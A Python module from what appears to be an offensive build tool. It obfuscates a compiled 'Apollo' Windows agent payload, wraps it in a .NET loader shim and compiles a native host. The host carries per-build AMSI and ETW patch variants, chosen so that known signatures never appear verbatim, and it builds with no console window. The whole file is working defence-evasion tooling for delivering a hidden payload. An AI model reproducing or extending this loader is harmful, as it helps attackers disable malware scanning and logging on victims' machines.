"""Mode B native early-boot CLR host building via the discovered dev-laptop toolchain
(R5 / AC6).

``build_native_host`` is the engine behind ``obfuscate build-host``: it takes the
compiled Apollo ``WinExe`` bytes in memory, runs the SAME default R3 static
passes as ``harden`` (via ``harden.apply_passes`` -- never a re-implementation),
compiles the mode B managed loader shim (``shim/ApolloShim.cs``) with the
hardened payload embedded where a .NET build exists, interpolates the native
host template (``host/host.c``) with seed-derived AMSI/ETW patch variants,
compiles that with the native toolchain discovered on the dev laptop, and
records toolchain/shim/embed provenance for the ``hardening['host']`` report
section.

Failure semantics (R5/R1):

* No native toolchain (cargo/gcc/cc/cl) on PATH -> :class:`ToolchainError`
  (mapped to exit 2 by the CLI handler; never silent).
* A native compile failure -> :class:`ToolchainError` (exit 2).
* Only a missing mode B .NET shim build -> ``{"status": "shim_unavailable"}``
  returned (skipped, exit 0); Mode A is unaffected.

The tests in ``tests/test_host.py`` run on a box with no cargo/gcc on PATH, so
``discover_toolchain`` returns ``None`` here and the compiler paths are
exercised through a monkeypatched fake compiler.
"""

from __future__ import annotations

import os
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, List, Optional

from obfuscate.harden import _CHECKSUM_MODES, _DEFAULT_SEED, apply_passes
from obfuscate.patch import variant
from obfuscate.pe import analyze

_REPO_ROOT = Path(__file__).resolve().parent.parent
_HOST_C = _REPO_ROOT / "host" / "host.c"
_SHIM_CS = _REPO_ROOT / "shim" / "ApolloShim.cs"

# Shared byte constants for host-mode detection.  ``HOST_MARKER`` is embedded
# as a C string literal in the compiled native host so verify.py can scan for
# it to distinguish host-mode outputs from regular hardened .NET images.
# ``EMBED_MARKER`` is a short byte sequence embedded near the payload for
# structural verification.  Both constants must be kept in sync with verify.py.
HOST_MARKER = b"OBFUSCATE_HOST_V1"
EMBED_MARKER = b"\xAB\xCD\xEF\x01\xAB\xCD\xEF\x01"
PATCH_MARKER = b"OBFUSCATE_PATCH_V1"

# Native compile timeout (seconds); the shim .NET build can be slower on a
# cold machine.
_COMPILE_TIMEOUT = 180

# host.c tokens host.py must substitute before compiling (host/README.md).
_HOST_TOKENS = (
    "__RUNTIME_PATCH_ENABLED__",
    "__PATCH_AMSI_X86__",
    "__PATCH_AMSI_X64__",
    "__PATCH_ETW_X86__",
    "__PATCH_ETW_X64__",
    "__SHIM_BYTES__",
)
_SHIM_TOKEN = "__APOLLO_BYTES__"

# Per-arch/per-target token suffix used to expand `__PATCH_<TARGET>_<ARCH>__`.
_PATCH_COMBOS = (("amsi", "x86"), ("amsi", "x64"), ("etw", "x86"), ("etw", "x64"))


class ToolchainError(Exception):
    """Raised when the native toolchain is missing or the native compile fails.

    The ``build-host`` CLI handler maps this exception to exit code 2 (R1/R5);
    a missing native toolchain or native-compile failure is a build failure,
    never a silent skip.
    """


def _probe_version(command, *args) -> Optional[str]:
    """Run a tool for its version banner; return the first non-empty line."""
    try:
        proc = subprocess.run(
            [command, *args],
            capture_output=True,
            timeout=_COMPILE_TIMEOUT,
            text=True,
        )
    except (OSError, subprocess.SubprocessError):
        return None
    text = (proc.stdout.strip() + "\n" + proc.stderr.strip()).strip()
    if not text:
        return None
    return text.splitlines()[0].strip()


def discover_toolchain() -> Optional[Dict[str, str]]:
    """Probe for a native host toolchain on the dev laptop (R5).

    Order: cargo (the dev-laptop rust toolchain), then ``gcc``/``cc``, then
    ``cl``.  Returns ``{"name", "version", "kind"}`` for the first probe that
    both resolves on PATH and answers a version probe, or ``None`` when no
    toolchain is usable.  A VS2019 ``cl.exe`` that requires vcvars (not on
    PATH) is intentionally treated as absent by this simple probe: it only
    resolves ``cl`` via ``shutil.which``.
    """
    candidates = (
        ("cargo", ("cargo",), ("--version",), "rust"),
        ("gcc", ("gcc",), ("--version",), "gcc"),
        ("cc", ("cc",), ("--version",), "cc"),
        ("cl", ("cl",), (), "msvc"),
    )
    for name, names, args, kind in candidates:
        path = None
        for tool in names:
            path = shutil.which(tool)
            if path:
                break
        if path is None:
            continue
        # cl.exe's banner is emitted with no arguments at all; gcc/cc/cargo
        # answer `--version`.
        version = _probe_version(path, *args)
        if version is None:
            continue
        return {"name": name, "version": version, "kind": kind}
    return None


def _byte_list(data: bytes) -> str:
    """Render *data* as a comma-separated ``0xNN, ...`` C byte literal body."""
    return ", ".join(f"0x{b:02X}" for b in data)


def _read_text(path: Path) -> str:
    return path.read_text(encoding="utf-8")


def _render_shim(apollo_bytes: bytes) -> str:
    """Interpolate the hardened payload into the shim source (shim/README.md)."""
    source = _read_text(_SHIM_CS)
    if _SHIM_TOKEN not in source:
        raise ToolchainError(f"shim source has no {_SHIM_TOKEN} marker")
    return source.replace(_SHIM_TOKEN, _byte_list(apollo_bytes))


def _render_host(patch_enabled: bool, seed: int, shim_bytes: bytes) -> str:
    """Interpolate every token of the native host template with this build's values.

    ``__PATCH_*__`` values come from ``patch.variant(seed, arch, target)`` so each
    deploy carries a fresh seed-derived functional equivalent and the canonical
    public AMSI/ETW constants never appear verbatim (R5/R6a).  Any token left
    unreplaced is a loud failure, never a silent partial build.
    """
    source = _read_text(_HOST_C)

    def substitute(token: str, value: str) -> str:
        if token not in source:
            raise ToolchainError(f"host template has no {token} marker")
        return source.replace(token, value)

    source = substitute("__RUNTIME_PATCH_ENABLED__", "1" if patch_enabled else "0")
    for target, arch in _PATCH_COMBOS:
        token = f"__PATCH_{target.upper()}_{arch.upper()}__"
        source = substitute(token, _byte_list(variant(seed, arch, target)))
    source = substitute("__SHIM_BYTES__", _byte_list(shim_bytes))
    return source


def _compile_shim(shim_source: str) -> Optional[bytes]:
    """Compile the interpolated shim source to a small .NET assembly via ``dotnet``.

    Returns the compiled assembly bytes, or ``None`` when no ``dotnet`` build is
    available or the build fails (both cases are ``shim_unavailable`` per R5).
    """
    dotnet = shutil.which("dotnet")
    if dotnet is None:
        return None
    with tempfile.TemporaryDirectory(prefix="obfuscate_shim_") as tmp:
        src_path = os.path.join(tmp, "ApolloShim.cs")
        with open(src_path, "w", encoding="utf-8") as fh:
            fh.write(shim_source)
        project = _CSPROJ.replace("{tmp}", tmp)
        proj_path = os.path.join(tmp, "ApolloShim.csproj")
        with open(proj_path, "w", encoding="utf-8") as fh:
            fh.write(project)
        try:
            proc = subprocess.run(
                [dotnet, "build", proj_path, "-c", "Release", "-o", tmp, "--nologo"],
                capture_output=True,
                text=True,
                timeout=_COMPILE_TIMEOUT,
            )
        except (OSError, subprocess.SubprocessError):
            return None
        dll_path = os.path.join(tmp, "ApolloShim.dll")
        if proc.returncode != 0 or not os.path.isfile(dll_path):
            return None
        with open(dll_path, "rb") as fh:
            return fh.read()


def _gcc_command() -> str:
    path = shutil.which("gcc") or shutil.which("cc")
    if path is None:
        raise ToolchainError(
            "discovered toolchain needs gcc/cc to compile the C host, but neither "
            "is on PATH"
        )
    return path


def compile_host(host_source: str, output_path: str, toolchain: Dict[str, str]):
    """Compile the interpolated native host to a single self-contained exe.

    ``toolchain`` comes from :func:`discover_toolchain`; the C host is compiled
    by gcc/cc for the gcc/cc/rust kinds and by cl.exe for the msvc kind.  Any
    native compile failure raises :class:`ToolchainError` (R5: never silent).
    """
    kind = toolchain.get("kind")
    with tempfile.TemporaryDirectory(prefix="obfuscate_hostc_") as tmp:
        src_path = os.path.join(tmp, "host.c")
        with open(src_path, "w", encoding="utf-8") as fh:
            fh.write(host_source)
        if kind == "msvc":
            cl = shutil.which("cl")
            if cl is None:
                raise ToolchainError(
                    "discovered toolchain is cl.exe but it is not on PATH "
                    "(vcvars needed for cl are not covered by the simple probe)"
                )
            # /SUBSYSTEM:WINDOWS (no console window) requires the main() C
            # entry point to be named explicitly: Intel/Clang linkers default
            # to WinMainCRTStartup under that subsystem and otherwise fail
            # with unresolved WinMain even though host.c defines main().
            command = [cl, "/nologo", "/O1", "/W4", "/D", "_CRT_SECURE_NO_WARNINGS",
                       src_path, "/Fe:" + output_path, "/link", "/SUBSYSTEM:WINDOWS",
                       "/ENTRY:mainCRTStartup"]
        else:
            gcc = _gcc_command()
            command = [gcc, "-static", "-O2", "-o", output_path, src_path]
        try:
            proc = subprocess.run(command, capture_output=True, text=True, timeout=_COMPILE_TIMEOUT)
        except OSError as exc:
            raise ToolchainError(f"native compile failed to start: {exc}") from exc
        if proc.returncode != 0:
            detail = (proc.stderr or proc.stdout).strip()
            raise ToolchainError(f"native compile failed (exit {proc.returncode}): {detail}")


def _read(path: str) -> bytes:
    with open(path, "rb") as fh:
        return fh.read()


def _record_embed(output_path: str, hardened_payload: bytes, shim_bytes: bytes) -> dict:
    """Locate the embedded payload/shim inside the compiled host and record offsets."""
    try:
        exe = _read(output_path)
    except OSError:
        return {
            "shim_offset": None,
            "payload_offset": None,
            "payload_embedded": False,
            "self_contained": False,
            "marker": "host.c:SHIM_BYTES",
            "embed_marker_offset": None,
        }
    shim_off = exe.find(shim_bytes) if shim_bytes else -1
    payload_off = exe.find(hardened_payload) if hardened_payload else -1
    embed_off = exe.find(EMBED_MARKER)
    return {
        "shim_offset": shim_off if shim_off >= 0 else None,
        "payload_offset": payload_off if payload_off >= 0 else None,
        "payload_embedded": payload_off >= 0,
        "self_contained": shim_off >= 0,
        "marker": "host.c:SHIM_BYTES",
        "embed_marker_offset": embed_off if embed_off >= 0 else None,
    }


def build_shim(apollo_bytes: bytes) -> Optional[bytes]:
    """Compile the mode B managed loader shim embedding *apollo_bytes*.

    Returns the compiled shim assembly bytes, or ``None`` when no .NET build is
    available or the build fails -- the caller reports ``shim_unavailable``
    (skipped, exit 0; R5).
    """
    return _compile_shim(_render_shim(apollo_bytes))


def _harden_payload(
    apollo_bytes: bytes,
    seed: int,
    no_metadata: bool,
    no_attributes: bool,
    no_strings: bool,
    checksum: str,
):
    """Analyze + harden the in-memory payload (R5: same R3 passes as harden).

    ``pe.analyze`` is file-based, so the payload is materialized to a transient
    probe file in a temp dir (removed on return); the passes then run over the
    in-memory bytes exactly as ``harden.run_harden`` does.
    """
    with tempfile.TemporaryDirectory(prefix="obfuscate_host_") as tmp:
        probe = os.path.join(tmp, "payload.exe")
        with open(probe, "wb") as fh:
            fh.write(apollo_bytes)
        pe_info = analyze(probe)
        pe_info["path"] = probe
        pe_info["data"] = bytes(apollo_bytes)
        return apply_passes(
            apollo_bytes,
            pe_info,
            seed,
            no_metadata=no_metadata,
            no_attributes=no_attributes,
            no_strings=no_strings,
            checksum=checksum,
        )


def _provenance(
    toolchain: Dict[str, str],
    shim_status: str,
    patch_enabled: bool,
    seed: int,
    enabled_passes: List[str],
    checksum: str,
    apollo_src,
    findings=None,
    shim_bytes: Optional[bytes] = None,
    embed: Optional[dict] = None,
) -> dict:
    doc: Dict[str, object] = {
        "status": shim_status,
        "toolchain": toolchain,
        "shim": "compiled" if shim_status == "ok" else "unavailable",
        "patch_enabled": bool(patch_enabled),
        "seed": seed,
        "passes": enabled_passes,
        "checksum": checksum,
        "apollo_src": str(apollo_src) if apollo_src else None,
    }
    if findings is not None:
        doc["findings"] = [
            {"catalog_id": cid, "offset": off, "description": desc}
            for cid, off, desc in findings
        ]
    if shim_bytes is not None:
        doc["shim_size"] = len(shim_bytes)
    if embed is not None:
        doc["embed"] = embed
    return doc


def build_native_host(
    apollo_bytes,
    seed,
    output_path,
    *,
    patch_enabled=True,
    no_metadata=False,
    no_attributes=False,
    no_strings=False,
    checksum="zero",
    apollo_src=None,
):
    """Build the mode B self-contained exe from in-memory Apollo bytes (R5/AC6).

    Parameters
    ----------
    apollo_bytes : bytes
        Compiled Apollo ``WinExe`` image bytes to harden and embed.
    seed : int or None
        Determinism seed for the R3 passes and the per-build AMSI/ETW patch
        variants.  ``None`` becomes ``_DEFAULT_SEED``.
    output_path : str or os.PathLike
        Where the self-contained ``patched_apollo.exe`` is written.
    patch_enabled : bool
        When False (``--no-patch``) the runtime patch portion compiles out,
        giving the canary baseline; the static passes still run.
    no_metadata / no_attributes / no_strings : bool
        Pass the same ``--no-*`` toggles as ``harden`` (R3).
    checksum : str
        ``"zero"`` or ``"recompute"`` (default ``"zero"``).
    apollo_src : str or os.PathLike or None
        Recorded in provenance only (an ``agent_code`` checkout path).

    Returns
    -------
    dict
        Provenance for the ``hardening['host']`` report section.  When the .NET
        shim cannot be compiled the dict carries ``status == "shim_unavailable"``
        (skipped, exit 0); otherwise ``status == "ok"``.

    Raises
    ------
    ToolchainError
        When no native toolchain is on PATH or the native compile fails
        (mapped to exit 2; never silent).
    obfuscate.pe.PeReadError
        When *apollo_bytes* cannot be parsed as a .NET CLI image.
    ValueError
        When *checksum* is not a known mode.
    """
    if seed is None:
        seed = _DEFAULT_SEED
    apollo_bytes = bytes(apollo_bytes)
    output_path = os.fspath(output_path)
    if checksum not in _CHECKSUM_MODES:
        raise ValueError(f"checksum must be one of {_CHECKSUM_MODES}, got {checksum!r}")

    hardened_payload, findings = _harden_payload(
        apollo_bytes, seed, no_metadata, no_attributes, no_strings, checksum
    )
    passes = []
    if not no_metadata:
        passes.append("metadata")
    if not no_attributes:
        passes.append("attributes")
    if not no_strings:
        passes.append("strings")

    toolchain = discover_toolchain()
    if toolchain is None:
        raise ToolchainError(
            "no native toolchain found on PATH (probed cargo, gcc/cc, cl); "
            "build-host cannot compile the early-boot CLR host and fails with "
            "exit 2 (R5)"
        )

    shim_bytes = build_shim(hardened_payload)
    if shim_bytes is None:
        return _provenance(
            toolchain,
            "shim_unavailable",
            patch_enabled,
            seed,
            passes,
            checksum,
            apollo_src,
            findings=findings,
            shim_bytes=None,
        )

    host_source = _render_host(patch_enabled, seed, shim_bytes)
    parent = os.path.dirname(os.path.abspath(output_path))
    os.makedirs(parent, exist_ok=True)
    compile_host(host_source, output_path, toolchain)
    embed = _record_embed(output_path, hardened_payload, shim_bytes)

    return _provenance(
        toolchain,
        "ok",
        patch_enabled,
        seed,
        passes,
        checksum,
        apollo_src,
        findings=findings,
        shim_bytes=shim_bytes,
        embed=embed,
    )


# Minimal .NET Framework 4.0 class-library project so the shim compiles with a
# dev-laptop `dotnet` that carries the reference assemblies.
_CSPROJ = """<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup>
    <OutputType>Library</OutputType>
    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
    <Configuration Condition="'$(Configuration)' == ''">Release</Configuration>
    <Platform Condition="'$(Platform)' == ''">AnyCPU</Platform>
    <OutputPath>{tmp}</OutputPath>
    <AssemblyName>ApolloShim</AssemblyName>
  </PropertyGroup>
  <ItemGroup>
    <Compile Include="ApolloShim.cs" />
    <Reference Include="mscorlib" />
  </ItemGroup>
</Project>
"""